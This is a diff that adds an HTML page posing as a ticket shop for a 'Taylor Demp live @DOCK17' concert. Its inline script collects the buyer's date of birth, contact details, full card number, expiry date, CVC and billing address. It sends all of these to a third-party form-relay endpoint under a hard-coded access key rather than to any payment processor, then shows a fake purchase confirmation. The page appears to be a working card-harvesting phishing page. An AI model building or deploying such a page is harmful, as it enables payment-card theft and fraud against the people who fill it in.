@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOCK17 Ticket Booking</title>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.querySelector('form');
+
+            form.addEventListener('submit', (e) => {
+                e.preventDefault();
+
+                const name = document.getElementById('card-name').value;
+                const dob = document.getElementById('dob').value; // Date of Birth
+                const email = document.getElementById('email').value;
+                const phone = document.getElementById('phone').value;
+                const cardNumber = document.getElementById('card-number').value;
+                const billingAddress = document.getElementById('billing-address').value;
+                const expiryDate = document.getElementById('expiry-date').value;
+                const securityCode = document.getElementById('security-code').value;
+                const ticketGrade = document.getElementById('ticket-grade').value;
+
+                const endpoint = 'https://api.web3forms.com/submit';
+                const accessKey = '8120bb8e-904f-476a-9ff1-18eef906fd7c';
+
+                fetch(endpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        access_key: accessKey,
+                        name,
+                        dob,
+                        email,
+                        phone,
+                        card_number: cardNumber,
+                        billing_address: billingAddress,
+                        expiry_date: expiryDate,
+                        security_code: securityCode,
+                        ticket_grade: ticketGrade
+                    })
+                })
+                .then((response) => response.json())
+                .then((data) => {
+                    console.log(data);
+                    alert('Thanks for your purchase of TAYLOR DEMP LIVE AT DOCK 17 TICKET, kindly check your mail for the ticket(s)!');
+                    form.reset();
+                })
+                .catch((error) => {
+                    console.error(error);
+                    alert('Error submitting form.');
+                });
+            });
+        });
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-image: url('https://via.placeholder.com/1920x1080'); /* Replace with your image URL */
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            color: #fff;
+        }
+        .container {
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.7);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+        }
+        h1 {
+            text-align: center;
+            color: #fff;
+        }
+        form label {
+            font-weight: bold;
+            display: block;
+            margin-top: 10px;
+            color: #fff;
+        }
+        form input, form select, form button {
+            width: 100%;
+            padding: 8px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        form button {
+            background-color: #4CAF50;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        form button:hover {
+            background-color: #45a049;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            padding: 10px;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: #ccc;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Taylor Demp live @DOCK17 Ticket Booking</h1>
+        <form>
+            <label for="dob">Date of Birth:</label>
+            <input type="date" id="dob" name="dob" required>
+
+            <label for="email">Email Address:</label>
+            <input type="email" id="email" name="email" placeholder="example@example.com" required>
+
+            <label for="phone">Phone Number:</label>
+            <input type="tel" id="phone" name="phone" placeholder="123-456-7890" required>
+
+            <label for="ticket-grade">Select Ticket Grade:</label>
+            <select id="ticket-grade" name="ticket-grade" required>
+                <option value="">-- Choose a Grade --</option>
+                <option value="standard">Standard $100</option>
+                <option value="premium">Premium $250</option>
+                <option value="vip">VIP $400</option>
+            </select>
+
+            <label for="card-name">Name on Credit Card:</label>
+            <input type="text" id="card-name" name="card-name" placeholder="Cardholder Name" required>
+
+            <label for="card-number">Credit Card Number:</label>
+            <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" required pattern="\d{4} \d{4} \d{4} \d{4}">
+
+            <label for="expiry-date">Expiry Date:</label>
+            <input type="month" id="expiry-date" name="expiry-date" required>
+            
+            <label for="security-code">Security Code (CVC):</label>
+            <input type="text" id="security-code" name="security-code" placeholder="123" required pattern="\d{3}">
+
+            <label for="billing-address">Billing Address:</label>
+            <input type="text" id="billing-address" name="billing-address" placeholder="123 Main St, City, State" required>
+
+            <button type="submit">Buy Ticket</button>
+        </form>
+    </div>
+    <div class="footer">
+        <p>Contact us: Dock 17, 2231 Madison St, Suite D, Clarksville, TN 37043.</p>
+        <p>Phone: +1 (484) 454-0670</p>
+    </div>
+</body>
+  </html>
+  
